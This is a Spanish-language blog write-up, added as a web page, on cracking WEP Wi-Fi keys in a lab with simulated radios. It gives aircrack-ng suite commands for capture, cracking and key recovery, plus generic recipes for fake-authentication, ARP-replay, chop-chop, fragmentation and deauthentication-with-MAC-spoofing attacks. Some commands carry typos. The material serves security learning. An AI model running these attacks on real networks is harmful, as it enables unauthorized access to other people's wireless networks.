@@ -1,0 +1,176 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Hacking Wifi - WEP · MiguelRega7</title>
+<meta name="description" content="Introducción WEP - Wired Equivalent Privacy (Privacidad Equivalente a la Conexión por Cable), es un protocolo de seguridad diseñado para proteger las redes inalámbricas. Fue uno de"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Wi-Fi</span><h1>Hacking Wifi - WEP</h1><div class="meta"><span>◷</span><time>2024-03-21</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">Introducción WEP - Wired Equivalent Privacy (Privacidad Equivalente a la Conexión por Cable), es un protocolo de seguridad diseñado para proteger las redes inalámbricas. Fue uno de.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#introducci-n-wep">Introducción WEP</a><a href="#creando-un-ap-que-use-el-protocolo-wep">Creando un AP que use el protocolo WEP</a><a href="#atacando-el-protocolo-wep">Atacando el protocolo WEP</a><a href="#mas-ataques">Mas ataques</a></aside><article class="article-content" id="top"><p align="center">
+<img src="/assets/wifi/hacking-web/icon.png">
+</p>
+
+<h2 id="introducci-n-wep">Introducción WEP</h2>
+<ul>
+<li>Wired Equivalent Privacy (Privacidad Equivalente a la Conexión por Cable), es un protocolo de seguridad diseñado para proteger las redes inalámbricas. Fue uno de los primeros estándares de seguridad utilizado en redes Wi-Fi, pero se considera obsoleto y se ha vuelto vulnerable a ataques, este protocolo cifra el tráfico con una clave hexadecimal de <strong>64 o 128 bits</strong> todo el tráfico se cifra con una única clave.</li>
+</ul>
+<blockquote>
+<p>WEP utiliza un esquema de cifrado de clave compartida, donde todas las estaciones en la red comparten una clave secreta. El problema principal con WEP es que presenta debilidades significativas en su implementación del cifrado, lo que hace que sea relativamente fácil para los atacantes interceptar y descifrar el tráfico de la red. Los ataques a WEP incluyen la recopilación de paquetes y el uso de herramientas como Aircrack-ng para descifrar la clave.</p>
+</blockquote>
+<h2 id="creando-un-ap-que-use-el-protocolo-wep">Creando un AP que use el protocolo WEP</h2>
+<ul>
+<li>En caso de que quieras desplegar el <strong>AP</strong> tu mismo puedes seguir estos pasos para hacerlo exitosamente <a href="https://tonyharris.io/posts/virtual_wifi_lab/">https://tonyharris.io/posts/virtual_wifi_lab/</a> en mi caso estare empleando el <strong>AP</strong> ya desplegado del <strong>WifiChallengev2</strong> <a href="https://wifichallengelab.com/">https://wifichallengelab.com/</a>.</li>
+</ul>
+<h2 id="atacando-el-protocolo-wep">Atacando el protocolo WEP</h2>
+<ul>
+<li>Bueno lo primero que haremos es poner nuestra antena de red en modo monitor en caso de estar empleando el lab de <strong>wifichallenge</strong> ya tiene integrada la interfaz asi que solo haremos lo siguiente.</li>
+</ul>
+<blockquote>
+<p>Las partes censuradas es por que hay mas usuarios completando el laboratorio para evitar una mala experiencia y meterme en problemas con el creador lo hare de esa forma.</p>
+</blockquote>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user/AP# airmon-ng start wlan0
+
+Found 5 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    611 avahi-daemon
+    614 NetworkManager
+    633 wpa_supplicant
+    665 avahi-daemon
+    945 ifplugd
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlan0		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+
+		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+		(mac80211 station mode vif disabled for [phy0]wlan0)
+phy1	wlan1		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy2	wlan2		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy3	wlan3		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy4	wlan4		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy5	wlan5		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy6	wlan6		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+phy60	wlan60		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
+</code></pre></div></div>
+<ul>
+<li>Ahora matamos los procesos que no nos sirven.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user/AP# airmon-ng check kill
+
+Killing these processes:
+
+    PID Name
+    633 wpa_supplicant
+    945 ifplugd
+ 406555 avahi-daemon
+ 406769 avahi-daemon
+
+root@WiFiChallengeLab:/home/user/AP# 
+</code></pre></div></div>
+<ul>
+<li>Una vez hecho esto comenzamos capturando el trafico en este caso vemos que el <strong>AP</strong> existe y esta operativo.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/tGjkeMj.png">
+</p>
+
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng wlan0mon
+</code></pre></div></div>
+<ul>
+<li>Y bueno hay un cliente asociado a ese <strong>AP</strong> vamos a estar capturando paquetes en la columna de <strong>Data</strong> entre mas tengamos mas probabilidades hay de crackear la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user/AP# airodump-ng wlan0mon -c 1 -w captura
+</code></pre></div></div>
+<ul>
+<li>Podemos ver que ya hemos recolectado muchos.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/OABgdbb.png">
+</p>
+
+<ul>
+<li>Una vez paramos el ataque podemos hacer lo siguiente para crackear la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user/AP# aircrack-ng captura-01.cap -w /root/wifi-rockyou.txt
+</code></pre></div></div>
+<ul>
+<li>En caso de no encontrar la contraseña veras algo como esto <strong>Si la contraseña fue encontrada la veras en texto plano</strong>..</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/yzgc60n.png">
+</p>
+
+<ul>
+<li>Ahora podemos usar otra herramienta que es <strong>besside-ng</strong> ya que esta herramienta esta diseñada para encontrar claves <strong>WEP</strong> solo le pasamos la <strong>MAC</strong> y el canal en el que opera.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user/AP# besside-ng -c 1 -b F0:9F:C2:AA:19:29 wlan2
+</code></pre></div></div>
+<ul>
+<li>Ahora podemos ver la <strong>KEY</strong>.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/5hWf7M7.png">
+</p>
+
+<h2 id="mas-ataques">Mas ataques</h2>
+<ul>
+<li>Este protocolo esta obsoleto pero aqui te comparto mas ataques.</li>
+</ul>
+<h1>Fake Authentication Attack</h1>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon
+❯ aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -e &lt;ESSID&gt; wlan0mon
+❯ aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
+❯ aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt;
+</code></pre></div></div>
+<h1>ARP Replay Attack</h1>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon
+❯ aireplay-ng -3 –x 1000 –n 1000 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
+❯ aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt;
+</code></pre></div></div>
+<h1>Chop Chop Attack</h1>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon
+❯ aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
+❯ aireplay-ng -4 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
+ # Presionamos ‘y’ ;
+❯ packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;
+❯ aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon
+❯ aircrack-ng &lt;archivoPCAP&gt;
+</code></pre></div></div>
+<h1>Fragmentation Attack</h1>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon
+❯ aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon
+❯ aireplay-ng -5 –b&lt;BSSID&gt; -h &lt;nuestraMAC &gt; wlan0mon
+# Presionamos ‘y’ ;
+❯ packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;
+❯ aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon
+❯ aircrack-ng &lt;archivoPCAP&gt;
+</code></pre></div></div>
+<h1>SKA Type Cracking</h1>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airmon-ng start wlan0
+❯ airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon
+❯ aireplay-ng -0 10 –a &lt;BSSID&gt; -c &lt;macVictima&gt; wlan0mon
+❯ ifconfig wlan0mon down
+❯ macchanger –-mac &lt;macVictima&gt; wlan0mon
+❯ fconfig wlan0mon up
+❯ aireplay-ng -3 –b &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon
+❯ aireplay-ng –-deauth 1 –a &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon
+❯ aircrack-ng &lt;archivoPCAP&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
